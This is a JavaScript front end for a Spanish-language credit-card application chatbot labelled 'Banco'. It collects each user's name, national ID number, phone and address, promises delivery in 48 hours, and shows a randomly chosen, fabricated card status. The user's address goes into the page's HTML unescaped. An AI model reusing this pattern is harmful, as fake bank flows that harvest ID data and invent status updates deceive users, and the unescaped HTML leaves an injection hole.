// main.js

let datos = {};
let paso = 1;
let validando = null;
let esperando_confirmacion = false;
let esperando_nueva_direccion = false;
const chat = document.getElementById('chat');
const form = document.getElementById('chatForm');
const input = document.getElementById('input');

function agregarMensaje(texto, clase) {
    const div = document.createElement('div');
    div.className = clase;
    div.textContent = texto;
    chat.appendChild(div);
    chat.scrollTop = chat.scrollHeight;
}

function reproducirSonido() {
    const audio = new Audio('https://cdn.pixabay.com/audio/2022/07/26/audio_124bfa4c82.mp3');
    audio.play();
}

function hablar(texto) {
    if ('speechSynthesis' in window) {
        const utter = new SpeechSynthesisUtterance(texto);
        utter.lang = 'es-ES';
        window.speechSynthesis.speak(utter);
    }
}

function enviarDatos() {
    fetch('/chat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...datos, paso, validando })
    })
    .then(res => res.json())
    .then(respuesta => {
        if (respuesta.pregunta) {
            agregarMensaje('Banco: ' + respuesta.pregunta, 'bot');
            paso = respuesta.paso;
            validando = null;
        } else if (respuesta.validando) {
            agregarMensaje('Banco: ' + respuesta.mensaje, 'bot');
            validando = respuesta.siguiente;
            setTimeout(enviarDatos, 1200);
        } else if (respuesta.pregunta_final) {
            agregarMensaje('Banco: ' + respuesta.mensaje, 'bot');
            esperando_confirmacion = true;
        } else if (respuesta.pide_nueva_direccion) {
            agregarMensaje('Banco: ' + respuesta.mensaje, 'bot');
            esperando_nueva_direccion = true;
        } else if (respuesta.orden_creada) {
            agregarMensaje('Banco: ' + respuesta.mensaje, 'bot');
            reproducirSonido();
            setTimeout(() => {
                hablar(`¡Felicidades! Clasificaste para una tarjeta de crédito. La orden de entrega fue creada y te llegará en las próximas 48 horas a la dirección indicada. Tu número de solicitud es: ${respuesta.numeroSolicitud}.`);
            }, 1200);
            form.style.display = 'none';
            mostrarBotonEstado(respuesta.numeroSolicitud, datos.direccion);
        }
    });
}

function enviarDatosExtra(extra) {
    fetch('/chat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...datos, ...extra, paso, validando })
    })
    .then(res => res.json())
    .then(respuesta => {
        if (respuesta.pregunta_final) {
            agregarMensaje('Banco: ' + respuesta.mensaje, 'bot');
            esperando_confirmacion = true;
        } else if (respuesta.pide_nueva_direccion) {
            agregarMensaje('Banco: ' + respuesta.mensaje, 'bot');
            esperando_nueva_direccion = true;
        } else if (respuesta.orden_creada) {
            agregarMensaje('Banco: ' + respuesta.mensaje, 'bot');
            reproducirSonido();
            setTimeout(() => {
                hablar(`¡Felicidades! Clasificaste para una tarjeta de crédito. La orden de entrega fue creada y te llegará en las próximas 48 horas a la dirección indicada. Tu número de solicitud es: ${respuesta.numeroSolicitud}.`);
            }, 1200);
            form.style.display = 'none';
            mostrarBotonEstado(respuesta.numeroSolicitud, datos.direccion);
        }
    });
}

form.addEventListener('submit', function(e) {
    e.preventDefault();
    const valor = input.value.trim();
    if (!valor) return;
    agregarMensaje('Tú: ' + valor, 'user');
    input.value = '';

    if (esperando_confirmacion) {
        esperando_confirmacion = false;
        if (valor.toLowerCase() === "si" || valor.toLowerCase() === "sí") {
            enviarDatosExtra({ direccion_confirmada: "si" });
        } else {
            esperando_nueva_direccion = true;
            enviarDatosExtra({ direccion_confirmada: "no" });
        }
        return;
    }
    if (esperando_nueva_direccion) {
        esperando_nueva_direccion = false;
        enviarDatosExtra({ nueva_direccion: valor });
        return;
    }

    switch (paso) {
        case 1: datos.nombre = valor; break;
        case 2: datos.cedula = valor; break;
        case 3: datos.telefono = valor; break;
        case 4: datos.direccion = valor; break;
    }
    paso++;
    enviarDatos();
});

// Iniciar chat
agregarMensaje('Banco: ¡Bienvenido! Vamos a solicitar tu tarjeta de crédito. ¿Cuál es tu nombre completo?', 'bot');

function mostrarBotonEstado(numeroSolicitud, direccion) {
    const estadoDiv = document.getElementById('estado-tarjeta');
    estadoDiv.style.display = 'block';
    estadoDiv.innerHTML = `
        <b>¡Solicitud aceptada!</b><br>
        Tu tarjeta está en proceso y será entregada en máximo <b>48 horas</b> en:<br>
        <span style="color:#ce1126">${direccion}</span><br>
        <b>Número de solicitud:</b> <span style="color:#002b7f">${numeroSolicitud}</span><br><br>
        <button onclick="verEstadoTarjeta('${numeroSolicitud}')" style="background:#ce1126;color:#fff;padding:8px 18px;border:none;border-radius:6px;font-size:1em;cursor:pointer;">
            Ver estado de mi tarjeta
        </button>
        <div id="estado-resultado" style="margin-top:12px;"></div>
    `;
}

function verEstadoTarjeta(numeroSolicitud) {
    const estados = [
        "En proceso en el banco",
        "En ruta de entrega",
        "Listo para entregar",
        "Entregado"
    ];
    const estado = estados[Math.floor(Math.random()*estados.length)];
    document.getElementById('estado-resultado').innerHTML =
        `<b>Estado actual:</b> <span style="color:#1565c0">${estado}</span><br>
        <small>Número de solicitud: ${numeroSolicitud}</small>`;
}